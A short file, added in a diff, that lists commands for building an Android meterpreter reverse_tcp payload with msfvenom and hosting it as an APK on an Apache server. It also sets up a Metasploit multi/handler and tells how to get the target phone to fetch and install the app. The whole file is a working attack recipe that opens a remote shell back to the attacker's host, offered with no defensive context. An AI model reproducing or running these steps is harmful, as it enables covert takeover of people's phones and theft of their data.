@@ -1,0 +1,15 @@
+###COMMANDS###
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST = <YOUR IP> LPORT = 4444 R > /var/www/html/androidAPP.apk
+
+service apache2 start
+msfconsole
+	use multi/handler
+	set PAYLOAD android/meterpreter/reverse_tcp
+	set LHOST <YOUR IP>
+	exploit
+
+On Target Phone 
+search -->> http://<YOUR_IP>/androidAPP.apk
+
+Note: You can name your APK as you which, but type in the name as it was, when creating the APK.
